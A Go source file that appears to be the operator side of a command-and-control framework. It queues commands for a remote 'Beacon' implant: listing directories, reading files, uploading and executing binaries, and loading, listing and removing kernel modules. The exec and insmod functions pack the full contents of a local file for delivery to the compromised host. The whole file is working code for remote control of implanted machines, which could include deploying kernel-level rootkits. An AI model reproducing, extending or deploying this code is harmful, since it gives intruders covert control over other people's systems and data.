package main

import (
	"os"
	"path/filepath"
)

const (
	COMMAND_GET_JOB = 1
	COMMAND_NO_JOB  = 2
	COMMAND_LS      = 3
	COMMAND_CAT     = 4
	COMMAND_INSMOD  = 5
	COMMAND_EXEC    = 6
	COMMAND_RMMOD   = 7
	COMMAND_MODINFO = 8
	COMMAND_LSMOD   = 9
	COMMAND_USEMOD  = 10
	COMMAND_DMESG   = 11
)

func commandNoJobPacket() Packet {
	packet := Packet{}
	packet.packet_put_uint32(COMMAND_NO_JOB)

	return packet
}

func (beacon *Beacon) addCommandLs(path string) {
	beacon.mutex.Lock()

	if beacon.packet == nil {
		beacon.packet = &Packet{}
	}
	beacon.packet.packet_put_uint32(COMMAND_LS)
	beacon.packet.packet_put_uint32(uint32(len(path)))
	beacon.packet.packet_put_bytes([]byte(path))

	beacon.mutex.Unlock()
}

func (beacon *Beacon) addCommandCat(path string) {
	beacon.mutex.Lock()

	if beacon.packet == nil {
		beacon.packet = &Packet{}
	}
	beacon.packet.packet_put_uint32(COMMAND_CAT)
	beacon.packet.packet_put_uint32(uint32(len(path)))
	beacon.packet.packet_put_bytes([]byte(path))

	beacon.mutex.Unlock()
}

func (beacon *Beacon) addCommandExec(path string) error {

	content, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	exec_name := filepath.Base(path)

	beacon.mutex.Lock()

	if beacon.packet == nil {
		beacon.packet = &Packet{}
	}
	beacon.packet.packet_put_uint32(COMMAND_EXEC)
	beacon.packet.packet_put_uint32(uint32(len(exec_name)))
	beacon.packet.packet_put_bytes([]byte(exec_name))

	beacon.packet.packet_put_uint32(uint32(len(content)))
	beacon.packet.packet_put_bytes(content)

	beacon.mutex.Unlock()

	return nil
}

func (beacon *Beacon) addCommandInsmod(path string) error {

	content, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	mod_name := filepath.Base(path)

	beacon.mutex.Lock()

	if beacon.packet == nil {
		beacon.packet = &Packet{}
	}
	beacon.packet.packet_put_uint32(COMMAND_INSMOD)
	beacon.packet.packet_put_uint32(uint32(len(mod_name)))
	beacon.packet.packet_put_bytes([]byte(mod_name))

	beacon.packet.packet_put_uint32(uint32(len(content)))
	beacon.packet.packet_put_bytes(content)

	beacon.mutex.Unlock()

	return nil
}

func (beacon *Beacon) addCommandRmmod(mod_name string) error {

	beacon.mutex.Lock()

	if beacon.packet == nil {
		beacon.packet = &Packet{}
	}
	beacon.packet.packet_put_uint32(COMMAND_RMMOD)
	beacon.packet.packet_put_uint32(uint32(len(mod_name)))
	beacon.packet.packet_put_bytes([]byte(mod_name))

	beacon.mutex.Unlock()

	return nil
}

func (beacon *Beacon) addCommandLsmod() error {

	beacon.mutex.Lock()

	if beacon.packet == nil {
		beacon.packet = &Packet{}
	}
	beacon.packet.packet_put_uint32(COMMAND_LSMOD)

	beacon.mutex.Unlock()

	return nil
}

func (beacon *Beacon) addCommandModinfo(mod_name string) error {

	beacon.mutex.Lock()

	if beacon.packet == nil {
		beacon.packet = &Packet{}
	}
	beacon.packet.packet_put_uint32(COMMAND_MODINFO)
	beacon.packet.packet_put_uint32(uint32(len(mod_name)))
	beacon.packet.packet_put_bytes([]byte(mod_name))

	beacon.mutex.Unlock()

	return nil
}
